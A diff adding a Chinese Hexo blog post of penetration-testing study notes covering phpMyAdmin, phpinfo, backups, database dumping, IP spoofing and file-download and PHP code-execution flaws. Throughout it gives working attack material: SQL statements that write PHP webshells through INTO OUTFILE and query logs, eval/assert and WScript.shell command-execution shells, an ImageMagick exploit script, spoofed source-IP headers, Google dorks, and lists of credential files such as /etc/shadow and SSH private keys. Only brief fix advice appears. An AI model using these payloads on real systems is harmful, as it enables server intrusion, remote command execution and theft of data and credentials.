@@ -1,0 +1,593 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="keywords" content="" />
+  <meta name="author" content="John Doe" />
+  <meta name="description" content="" />
+  
+  
+  <title>
+    
+      渗透测试学习10：各类实战性点 
+      
+      
+      |
+    
+     Hexo
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/favicon.png">
+    <link rel="icon" href="/images/favicon.png">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  
+<link rel="stylesheet" href="/css/base.css">
+<link rel="stylesheet" href="/iconfont/iconfont.css">
+<link rel="stylesheet" href="/css/github-markdown.css">
+<link rel="stylesheet" href="/css/highlight.css">
+
+
+  <!-- jquery3.3.1 -->
+  <script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+
+  <!-- fancybox -->
+  <link href="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.css" rel="stylesheet">
+  <script async src="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.js"></script>
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/avatar.png" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">Oranges</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">Tags</a>
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          <a href="/friends/">Friends</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">About</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+<!-- LaTex Display -->
+<script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+<script type="text/javascript" id="MathJax-script" async
+  src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js">
+</script>
+<script>
+MathJax = {
+  tex: {
+    inlineMath: [['$', '$'], ['\\(', '\\)']]
+  }
+};
+</script>
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">渗透测试学习10：各类实战性点</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime" title="更新时间"></i>
+          2021-03-17 18:37:06
+        </span>
+        
+      </div>
+      <div class="markdown-body">
+        <h1 id="一、基于phpmyadmin的攻击"><a href="#一、基于phpmyadmin的攻击" class="headerlink" title="一、基于phpmyadmin的攻击"></a>一、基于phpmyadmin的攻击</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>phpMyAdmin 是一个以PHP为基础，以Web-Base方式架构在网站主机上的MySQL的数据库管理工具，让管理者可用Web接口管理MySQL数据库。</p>
+<h2 id="入口寻找"><a href="#入口寻找" class="headerlink" title="入口寻找"></a>入口寻找</h2><p>目录扫描，cms特性，谷歌黑语法，网站自带等方法可以找到phpmyadmin入口。</p>
+<h2 id="版本判断"><a href="#版本判断" class="headerlink" title="版本判断"></a>版本判断</h2><p>登录界面的问号有版本信息，也可以直接访问：/doc/html/index.html目录来查看。<br><img src="https://img-blog.csdnimg.cn/20210307124839825.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDMxNTA5OQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h2 id="登录口令爆破"><a href="#登录口令爆破" class="headerlink" title="登录口令爆破"></a>登录口令爆破</h2><p>利用burpsuite进行密码的暴力破解。</p>
+<h2 id="万能密码漏洞"><a href="#万能密码漏洞" class="headerlink" title="万能密码漏洞"></a>万能密码漏洞</h2><p>phpmyadmin2.11.3-2.11.4 这两个版本存在万能密码，直接使用<code>‘localhost’@&#39;@”</code>为账号登录就可以无需密码。<br>phpmyadmin2.11.9.2 这个版本存在空口令，直接root用户登陆。</p>
+<h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>需要先获取物理路径。</p>
+<h3 id="获取物理路径"><a href="#获取物理路径" class="headerlink" title="获取物理路径"></a>获取物理路径</h3><p>报错：<br>⽹站代码问题报错：如何报错？⼀般就是加 ‘ 等特殊字符<br>解析器（Web容器、中间件）报错：如 IIS7.5，如何报错？⼀般就是加⼀些不存在的⽬录名字<br>Google爆路径：结合关键字和site语法搜索出错⻚⾯的⽹⻚快照，常⻅关键字有warning和fatal error。注意，如果⽬标站点 是⼆级域名，site接的是其对应的顶级域名，这样得到的信息要多得多。<br><code>Site:xxx.edu.tw warning</code><br><code>Site:xxx.com.tw &quot;atal error&quot;</code><br>根据正常的安装⽂件猜：⽐如phpstudy的默认⽹站⽬录是：<code>c:/phpStudy/phpstudy/PHPTutorial/WWW/</code><br>读取解析去的配置⽂件：<br>正常情况我们是⽆法得知解析器的配置⽂件的，这个时候就是尝试解析器默认的安装路径。<br>取巧的方法是假设某种情况下，我们得知⽬标是⽤的phpstudy，可是不是在默认的路径，我们就可以读取路径 select @basedir ，得到路径后，推测⽹站路径。<br>旁站报错：你的⽬标是不报错的，但是不代表你的⽬标⽹站的邻居不报错啊。⽐如⽬标站是 <a target="_blank" rel="noopener" href="http://www.target.com/">www.target.com</a> ，它的邻居 是：<a target="_blank" rel="noopener" href="http://www.victim.com/">www.victim.com</a> ，邻居⽹站有注⼊，加 ‘ 后爆出它的⽹站某个⻚⾯路径是：<code>c:/wwwroot/victim/news.asp</code> ，那你根据这个推荐你的⽬标站点的路径就有可能是 <code>c:/wwwroot/target/</code> 。<br>其他信息：phpinfo⻚⾯、⽹站源码备份</p>
+<h3 id="常用方法获取shell"><a href="#常用方法获取shell" class="headerlink" title="常用方法获取shell"></a>常用方法获取shell</h3><p>直接用into outfile 直接在网站目录下写入webshell，但是该方法需要前提条件是：<br> (1) 当前的数据库用户有写权限<br> 执行：<code>show variables like &#39;%secure%&#39;</code>; 如果secure_file_priv如果非空，则只能在对应的目录下读文件，如果是空即可在其他目录写。Linux下默认/tmp目录可写。<br>(2) 知道web绝对路径<br>上一节。<br>(3) web路径能写<br> 在知道web路径的基础上，使用<code>select &#39;&lt;?php @eval($_POST[cmd]);?&gt;&#39; into outfile &#39;/var/www/xx/shell.php&#39;</code>;会报错提示<code>Can&#39;t create/write to file &#39;/var/www/html/.666.txt&#39; (Errcode: 13)</code> ，证明目录不可写，可以尝试网站下其他目录，如/upload、/templates、/cache等目录。</p>
+<h3 id="日志getshell"><a href="#日志getshell" class="headerlink" title="日志getshell"></a>日志getshell</h3><p>web路径不能写可以用这个方法。<br>前提：读写权限+web绝对路径，修改日志文件为webshell<br>两种方法写入shell<br>1.通过写入日志文件getshell，具体方法如下：<br>(1)开启日志记录:<br><code>set global general_log = &quot;ON&quot;;</code><br> (2)查看当前的日志目录:<br><code>show variables like &#39;general%&#39;;</code><br> (3)指定日志文件<br><code>set global general_log_file = &quot;C:/phpStudy/PHPTutorial/WWW/.404.php&quot;;</code><br> (4)写入执行代码：<br><code>select &quot;&lt;?php phpinfo();?&gt;&quot;; </code></p>
+<p>2.通过慢查询写入webshell，具体方法如下：<br>(1)查看当前慢查询日志目录：<br><code>show variables like &#39;%slow%&#39;;</code><br>(2)重新设置路径：<br><code>set GLOBAL slow_query_log_file=&#39;C:/phpStudy/PHPTutorial/WWW/slow.php&#39;;</code><br>(3)开启慢查询日志：<br><code>set GLOBAL slow_query_log=on;</code><br>(4)执行写入日志：<br><code>select &#39;&lt;?php phpinfo();?&gt;&#39; from mysql.db where sleep(10);</code></p>
+<h2 id="导出shell"><a href="#导出shell" class="headerlink" title="导出shell"></a>导出shell</h2><ol>
+<li>正常导出拿shell<br>姿1. <code>SELECT &quot;&lt;?php phpinfo();?&gt;&quot; INTO OUTFILE &quot;E:\\wamp\\wamp\\www\\2.php&quot; </code><br>姿2. <code>SELECT &quot;&lt;?php phpinfo();?&gt;&quot; INTO dumpFILE &quot;E:\\wamp\\wamp\\www\\2.php&quot;</code></li>
+<li>创建表导出<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE a (cmd text NOT NULL); </span><br><span class="line">INSERT INTO a (cmd) VALUES(&#39;&lt;?php eval($_POST[1]);?&gt;&#39;); </span><br><span class="line">select cmd from a into outfile &#39;D:&#x2F;phpMyAdmin&#x2F;libraries&#x2F;d.php&#39;; </span><br><span class="line">DROP TABLE IF EXISTS a;</span><br></pre></td></tr></table></figure></li>
+<li>猥琐型导出<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from admin where userid&#x3D;1 into outfile &quot;x:\\wwwroot\\sx.php&quot; LINES STARTING BY 0x3C3F70687020706870696E666F28293F3E%23</span><br></pre></td></tr></table></figure>
+写完语句，要⽤hackbar的urlencode编码⼀下，不然很⼤⼏率是不成功的哟。这个可以在基于MySQL的报错注⼊中 写webshell。 hackbar结果：<code>0x3C3F70687020706870696E666F28293F3E=&lt;?php phpinfo()?&gt;</code></li>
+</ol>
+<h1 id="二、phpinfo页面展开的渗透"><a href="#二、phpinfo页面展开的渗透" class="headerlink" title="二、phpinfo页面展开的渗透"></a>二、phpinfo页面展开的渗透</h1><h2 id="获取phpinfo的方法"><a href="#获取phpinfo的方法" class="headerlink" title="获取phpinfo的方法"></a>获取phpinfo的方法</h2><p>扫描【⽬录扫描器】、Google Hacking、⽹站⾃有功能、同个服务器的其他站点等方法。</p>
+<h2 id="phpinfo存在的信息"><a href="#phpinfo存在的信息" class="headerlink" title="phpinfo存在的信息"></a>phpinfo存在的信息</h2><p>版本：version<br>操作系统：system<br>网站物理路径：_ENV[“SCRIPT_FILENAME”]<br>真实IP：_SERVER[“SERVER_ADDR”]<br>web服务器版本：_SERVER[“SERVER_SOFTWARE”]<br>是否开启远程包含：allow_url_include<br>魔术引号：magic_quotes_gpc<br>限制用户操作的文件：open_basedir<br>被禁止的PHP函数：disable_functions</p>
+<h2 id="绕过disable-functions"><a href="#绕过disable-functions" class="headerlink" title="绕过disable_functions"></a>绕过disable_functions</h2><p>disable_functions本质上就是个黑名单，这里介绍几种绕过方法。</p>
+<h3 id="黑名单绕过法"><a href="#黑名单绕过法" class="headerlink" title="黑名单绕过法"></a>黑名单绕过法</h3><p>由于disable_function本质上属于黑名单，这个时候就可以寻找是否有漏网之鱼，进行黑名单绕过。</p>
+<ol>
+<li>exec<br><code>&lt;?php echo exec(&#39;whoami&#39;);?&gt;</code></li>
+<li>shell_exec<br><code>&lt;?php echo shell_exec(&#39;whoami&#39;);?&gt;</code></li>
+<li>system<br><code>&lt;?php system(&#39;whoami&#39;);?&gt;</code></li>
+<li>passthru<br><code>&lt;?php passthru(&quot;whoami&quot;);?&gt;</code></li>
+<li>popen<br><code>&lt;?php $command=$_POST[&#39;cmd&#39;];$handle = popen($command , &quot;r&quot;);while(!feof($handle)) &#123; echo fread($handle, 1024); //fread($handle, 1024); &#125; pclose($handle);?&gt;</code></li>
+<li>proc_open<br><code>&lt;?php $command=&quot;ipconfig&quot;; $descriptorspec = array(1 =&gt; array(&quot;pipe&quot;, &quot;w&quot;)); $handle = proc_open($command ,$descriptorspec , $pipes); while(!feof($pipes[1])) &#123; echo fread($pipes[1], 1024); //fgets($pipes[1],1024); &#125;?&gt;</code><h3 id="系统组件绕过"><a href="#系统组件绕过" class="headerlink" title="系统组件绕过"></a>系统组件绕过</h3>window com组件(php 5.4)(高版本扩展要自己添加）<br>COM component（COM组件）是微软公司为了计算机工业的软件生产更加符合人类的行为方式开发的一种新的软件开发技术。在COM构架下，人们可以开发出各种各样的功能专一的组件，然后将它们按照需要组合起来，构成复杂的应用系统。<br>代码：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$command&#x3D;$_GET[&#39;shy&#39;];</span><br><span class="line">echo &quot;command:&quot;.$command.&quot;&lt;br&gt;&quot;;</span><br><span class="line">$wsh&#x3D;new COM(&#39;WScript.shell&#39;);&#x2F;&#x2F;实例化一个对象$wsh</span><br><span class="line">$exec&#x3D;$wsh-&gt;exec($command);&#x2F;&#x2F;调用这个对象的exec()方法执行命令</span><br><span class="line">$stdout&#x3D;$exec-&gt;StdOut();</span><br><span class="line">$stroutput&#x3D;$stdout-&gt;ReadAll();</span><br><span class="line">echo $stroutput;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="ImageMagick漏洞绕过"><a href="#ImageMagick漏洞绕过" class="headerlink" title="ImageMagick漏洞绕过"></a>ImageMagick漏洞绕过</h3>ImageMagick是一个功能强大的开源图形处理软件,可以用来读、写和处理超过90种的图片文件,包括流行的JPEG、GIF、 PNG、PDF以及PhotoCD等格式。<br>代码：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo &quot;Disable Functions: &quot; . ini_get(&#39;disable_functions&#39;) . &quot;\n&quot;;</span><br><span class="line"> </span><br><span class="line">$command &#x3D; PHP_SAPI &#x3D;&#x3D; &#39;cli&#39; ? $argv[1] : $_GET[&#39;cmd&#39;];</span><br><span class="line">if ($command &#x3D;&#x3D; &#39;&#39;) &#123;</span><br><span class="line">    $command &#x3D; &#39;id&#39;;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">$exploit &#x3D; &lt;&lt;&lt;EOF</span><br><span class="line">push graphic-context</span><br><span class="line">viewbox 0 0 640 480</span><br><span class="line">fill &#39;url(https:&#x2F;&#x2F;example.com&#x2F;image.jpg&quot;|$command&quot;)&#39;</span><br><span class="line">pop graphic-context</span><br><span class="line">EOF;</span><br><span class="line"> </span><br><span class="line">file_put_contents(&quot;KKKK.mvg&quot;, $exploit);</span><br><span class="line">$thumb &#x3D; new Imagick();</span><br><span class="line">$thumb-&gt;readImage(&#39;KKKK.mvg&#39;);</span><br><span class="line">$thumb-&gt;writeImage(&#39;KKKK.png&#39;);</span><br><span class="line">$thumb-&gt;clear();</span><br><span class="line">$thumb-&gt;destroy();</span><br><span class="line">unlink(&quot;KKKK.mvg&quot;);</span><br><span class="line">unlink(&quot;KKKK.png&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="绕过open-basedir"><a href="#绕过open-basedir" class="headerlink" title="绕过open_basedir"></a>绕过open_basedir</h2>命令执行函数绕过，可以使用命令执行函数来访问限制目录。<br>但是由于命令执行函数一般都会被限制在disable_function当中，所以我们需要寻找其他的途径来绕过限制。</li>
+</ol>
+<p>symlink()函数<br><code>bool symlink ( string $target , string $link )</code><br>symlink函数将建立一个指向target的名为link的符号链接，当然一般情况下这个target是受限于open_basedir的。</p>
+<p>glob伪协议<br>在筛选目录时是不受open_basedir的制约的，所以我们可以利用它来绕过限制，我们新建一个目录在/var/www/下命名为test<br>并且在/var/www/html/下新建t.php内容为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">        $a &#x3D; &quot;glob:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;test&#x2F;*.txt&quot;;</span><br><span class="line">        if ( $b &#x3D; opendir($a) ) &#123;</span><br><span class="line">                while ( ($file &#x3D; readdir($b)) !&#x3D;&#x3D; false ) &#123;</span><br><span class="line">                        echo &quot;filename:&quot;.$file.&quot;\n&quot;;</span><br><span class="line">                &#125;</span><br><span class="line">                closedir($b);</span><br><span class="line">        &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<h1 id="三、基于网站备份展开的渗透"><a href="#三、基于网站备份展开的渗透" class="headerlink" title="三、基于网站备份展开的渗透"></a>三、基于网站备份展开的渗透</h1><p>现在⽹站应该是⾮常常⻅的，正常情况下我们运维⼈员需要定期对⽹站进⾏备份，防⽌服务器问题导致⽹站数据丢失， 那么怎样备份⽹站呢？</p>
+<h2 id="怎么获取网站备份"><a href="#怎么获取网站备份" class="headerlink" title="怎么获取网站备份"></a>怎么获取网站备份</h2><p>目录扫描器<br>形如：bakcup.rar、back.rar、back.tar.gz、back.zip<br>⽹站备份专用扫描<br><a target="_blank" rel="noopener" href="http://www.baidu.com.rar/">www.baidu.com.rar</a> <a target="_blank" rel="noopener" href="http://www.baidu.com.zip/">www.baidu.com.zip</a><br>其他漏洞目录遍历漏洞</p>
+<h2 id="网站备份在渗透过程中有什么用"><a href="#网站备份在渗透过程中有什么用" class="headerlink" title="网站备份在渗透过程中有什么用"></a>网站备份在渗透过程中有什么用</h2><ul>
+<li><p>可以先进行代码审计，深度审计可先审计注⼊、上传页面情况，再审计垂直越权、代码（命令）执行等漏洞。</p>
+</li>
+<li><p>寻找网站配置⽂件 –&gt;尝试连接数据库 –&gt;获取网站后台密码 –&gt;&gt;udf提权</p>
+</li>
+<li><p>找到后台登录 –&gt;尝试弱口令/根据已有信息整理出字典进爆破 </p>
+</li>
+<li><p>查找其他可访问到的功能经行拿shell操作，如：上传页面可直接访问（未授权访问），存在sql执行页面并可直接访问（未授权访问）等。 </p>
+</li>
+<li><p>寻找⼀些网站系统说明⽂件或其他存在密码的⽂件，有可能直接登录网站后台或登录到其他系统。 </p>
+</li>
+<li><p>寻找同⾏留下的shell，可利用webshellkill等webshell查杀工具来查找到webshell</p>
+<h1 id="四、各类拖（脱）库方法"><a href="#四、各类拖（脱）库方法" class="headerlink" title="四、各类拖（脱）库方法"></a>四、各类拖（脱）库方法</h1><h2 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h2><p>是进⼊某个系统后，拿取该系统的数据库中的某些数据，把数据从数据库分离出来的过程叫拖库（脱裤）。</p>
+</li>
+</ul>
+<p>把数据传回我们⾃⼰的机器的过程叫“数据回传”，传输所⽤的⽹络通道叫“数据回传通道”，建⽴这个通道的过程叫“通道建⽴”。 该通道要有以下几个特性：安全、持久、快速。</p>
+<h2 id="注入点拖库"><a href="#注入点拖库" class="headerlink" title="注入点拖库"></a>注入点拖库</h2><p>原理： 通过SQL注⼊语句获取结果。<br>结论1： 在⼤批量数据库导出的时候，会对⽹站执⾏⾮常多的请求。<br>结论2： 如果注⼊点是盲注类型的话，我们⼀般是不会进行⼤批量数据的导出的，原因1：因为此操作会到处⼤批量的 SQL请求⽇志出现在服务器上⾯，只有要管理员稍微查看⼀下⽇志就会发现⽹站被攻击。原因2：盲注的速度实在是慢， 就算是⼏⼗MB的数据出库，都需要很久，更加不要说GB级和TB级别的数据量。</p>
+<p>sqlmap注入拖库：<br>就是sqlmap的常见用法，但是前提是要有注入点。<br>获取的数据存放在：<br><code>/pentest/web/scanners/sqlmap/output/so.126disk.com/dump/126disk/</code><br>获取后也可以进行解密。</p>
+<h2 id="获取webshell情况的拖库"><a href="#获取webshell情况的拖库" class="headerlink" title="获取webshell情况的拖库"></a>获取webshell情况的拖库</h2><p>拿到webshell后，就要找到数据库的连接信息，包括：账号、密码、数据库主机、端口，连接进数据库执⾏查询语句并导出。</p>
+<p>获取到数据库账号、密码、数据库主机、端口，可通过数据库管理程序连接。如果能控制数据库服务器，可把数据备份到服务器，再 回传，如若控制不到，就查询数据，然后导出。<br>常用企业级数据库管理程序：<br>mssql：navicat premium<br>mysql：mysqldump、phpmyadmin、navicat premium<br>oracle：navicat premium</p>
+<h1 id="五、HTTP请求源IP伪造"><a href="#五、HTTP请求源IP伪造" class="headerlink" title="五、HTTP请求源IP伪造"></a>五、HTTP请求源IP伪造</h1><p>在有⼀些⽬标站点配置了只允许特定的IP访问，在⽬标验证来源IP不够严苛的情况下，我们可以伪造IP来达到访 问某些Web应⽤的⽬的。<br>利⽤的前提是⽬标站点判断特定IP或者IP段是通过请求头来获取的。</p>
+<p>出现点：⼀些关键点：后台 重要的⼦站：⼤型⽹络的XXX管理后台、菠菜等⾮法站点后台。</p>
+<p>方法：burpsuite抓包后在HTTP请求包加⼊特定的请求头和值。<br>例子：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For:192.168.0.91 </span><br><span class="line">X-Originating-IP:192.168.0.92 </span><br><span class="line">X-Remote-IP:192.168.0.93 </span><br><span class="line">X-Remote-Addr:192.168.0.94 </span><br><span class="line">X-Client-IP:192.168.0.95</span><br></pre></td></tr></table></figure>
+<p>不知道IP可以尝试轮询（暴力破解）。</p>
+<h1 id="六、Github信息泄露利用"><a href="#六、Github信息泄露利用" class="headerlink" title="六、Github信息泄露利用"></a>六、Github信息泄露利用</h1><p>信息泄露不只是Github的，我们主要是关注泄漏的信息，而Github的泄漏是很重要的⼀个途径。<br>原理：很多⼈（程序猿）都是喜欢把代码放到Github的，他们在本地测试之后，可能会习惯把代码同步到Github，其中有可 能包括惯⽤密码的啊。能有密码是最好的啦，没有密码的话，能找到源码也是极好，审计⼀波，不管⿊盒还是⽩盒。</p>
+<p>方法：可以手动搜索，也可以安装⾃动化查询【监控】脚本。<br>⾃动化查询【监控】脚本⽐如有：Hawkeye、x-patrol、GSIL</p>
+<h1 id="七、文件下载漏洞的深化"><a href="#七、文件下载漏洞的深化" class="headerlink" title="七、文件下载漏洞的深化"></a>七、文件下载漏洞的深化</h1><p>漏洞介绍：⼀些⽹站的业务需要，可能提供⽂件查看或下载的功能，如果对⽤⼾查看或下载的⽂件不做限制及限制不够严格，就 能够查看或下载任意的⽂件（理论上），可以是⽹站⽂件，也有可能是系统⽂件等等。</p>
+<p>漏洞产⽣原因：存在读取⽂件的函数；读取⽂件的路径⽤⼾可控，且未校验或校验不严；输出了⽂件内容。</p>
+<p>漏洞利用思路：<br>这个并不是很直接的漏洞，根据权限的不同，我们能利用的方法也不同。<br>高权限：有时候⽬标的解析器可能是集成了⼀些⾼权限⽤⼾的权限，那么就可以去查看系统的⼀些敏感⽂件，包括密码⽂件、 配置⽂件，还可以查看各类终端连接⼯具的配置⽂件、⽇志，⽐如winscp，xshell。<br>低权限下 权限低能做的操作就少了，能查看到⽹站源码更甚是猜到旁站路径，拿到旁站源码也是极好的。</p>
+<p>挖掘方法：<br>可以扫描器（awvs）也可以手工。<br>谷歌黑语法</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">inurl:”readfile.php?file&#x3D;</span><br><span class="line">inurl:”read.php?filename&#x3D;</span><br><span class="line">inurl:”download.php?file&#x3D;</span><br><span class="line">inurl:”down.php?file&#x3D;</span><br></pre></td></tr></table></figure>
+<p>敏感信息<br>Windows：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">C:\boot.ini &#x2F;&#x2F;查看系统版本</span><br><span class="line">C:\Windows\System32\inetsrv\MetaBase.xml &#x2F;&#x2F;IIS配置文件</span><br><span class="line">C:\Windows\repair\sam &#x2F;&#x2F;存储系统初次安装的密码</span><br><span class="line">C:\Program Files\mysql\my.ini &#x2F;&#x2F;Mysql配置</span><br><span class="line">C:\Program Files\mysql\data\mysql\user.MYD &#x2F;&#x2F;Mysql root</span><br><span class="line">C:\Windows\php.ini &#x2F;&#x2F;php配置信息</span><br><span class="line">C:\Windows\my.ini &#x2F;&#x2F;Mysql配置信息</span><br></pre></td></tr></table></figure>
+<p>Linux：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;root&#x2F;.ssh&#x2F;authorized_keys &#x2F;&#x2F;如需登录到远程主机，需要到.ssh目录下，新建authorized_keys文件，并将id_rsa.pub内容复制进去</span><br><span class="line">&#x2F;root&#x2F;.ssh&#x2F;id_rsa &#x2F;&#x2F;ssh私钥,ssh公钥是id_rsa.pub</span><br><span class="line">&#x2F;root&#x2F;.ssh&#x2F;id_ras.keystore &#x2F;&#x2F;记录每个访问计算机用户的公钥</span><br><span class="line">&#x2F;root&#x2F;.ssh&#x2F;known_hosts</span><br><span class="line">&#x2F;&#x2F;ssh会把每个访问过计算机的公钥(public key)都记录在~&#x2F;.ssh&#x2F;known_hosts。当下次访问相同计算机时，OpenSSH会核对公钥。如果公钥不同，OpenSSH会发出警告， 避免你受到DNS Hijack之类的攻击。</span><br><span class="line">&#x2F;etc&#x2F;passwd &#x2F;&#x2F; 账户信息</span><br><span class="line">&#x2F;etc&#x2F;shadow &#x2F;&#x2F; 账户密码文件</span><br><span class="line">&#x2F;etc&#x2F;my.cnf &#x2F;&#x2F;mysql 配置文件</span><br><span class="line">&#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf &#x2F;&#x2F; Apache配置文件</span><br><span class="line">&#x2F;root&#x2F;.bash_history &#x2F;&#x2F;用户历史命令记录文件</span><br><span class="line">&#x2F;root&#x2F;.mysql_history &#x2F;&#x2F;mysql历史命令记录文件</span><br><span class="line">&#x2F;proc&#x2F;self&#x2F;fd&#x2F;fd[0-9]*(文件标识符)</span><br><span class="line">&#x2F;proc&#x2F;mounts &#x2F;&#x2F;记录系统挂载设备</span><br><span class="line">&#x2F;porc&#x2F;config.gz &#x2F;&#x2F;内核配置文件</span><br><span class="line">&#x2F;var&#x2F;lib&#x2F;mlocate&#x2F;mlocate.db &#x2F;&#x2F;全文件路径</span><br><span class="line">&#x2F;porc&#x2F;self&#x2F;cmdline &#x2F;&#x2F;当前进程的cmdline参数</span><br></pre></td></tr></table></figure>
+
+<p>修复方案：</p>
+<ul>
+<li>过滤.(点)，使用户在url中不能回溯上级目录</li>
+<li>正则严格判断用户输入参数的格式</li>
+<li>php.ini配置open_basedir限定文件访问范围<h1 id="八、PHP代码执行漏洞"><a href="#八、PHP代码执行漏洞" class="headerlink" title="八、PHP代码执行漏洞"></a>八、PHP代码执行漏洞</h1>由于开发⼈员编写源码时，没有针对代码中可执⾏的特殊函数⼊口做过滤，导致客⼾端可以提交恶意构造语句，并交由服务端执⾏。没有过滤类似system、eval和exec等函数，是该漏洞攻击成功的主要原因。</li>
+</ul>
+<p>常见执行函数：<br>1.eval函数：<br>eval函数把字符串作为PHP代码执行<br><code>&lt;?php eval(&quot;$_POST[1]&quot;)?&gt;</code></p>
+<p>2.assert函数：<br>assert函数检查一个断言是否为FALSE<br><code>&lt;?php assert($_POST[1])?&gt;</code></p>
+<p>3.call_user_func函数：<br>call_user_func函数把第一个参数作为回调函数调用函数语法:<br><code>mixed call_user_func ( callable $callback , array $param_arr )</code><br>第一个参数callback是被调用的回调函数，其余参数是回调函数的参数<br><code>&lt;?php call_user_func($_POST[&#39;fun&#39;],$_POST[&#39;arg&#39;])?&gt;</code><br>上述示例代码：通过POST型fun参数调用了system函数，通过POST型arg参数传入net user命令，执行了system(‘net usert’)，返回当前用户信息。</p>
+<p>4.call_user_fun_array函数：<br>call_user_func_array函数把第一个参数作为毁掉函数调用，把参数参数函数组作为回调函数函数语法:<br><code>mixed call_user_func_array ( callable $callback , array $param_arr )</code><br>call_user_func_array函数把第一个参数作为回调，把参数数组作为回调函数的参数传入<br><code>&lt;?php call_user_func_array($_POST[&#39;fun&#39;],$_POST[&#39;arg&#39;])?&gt;</code></p>
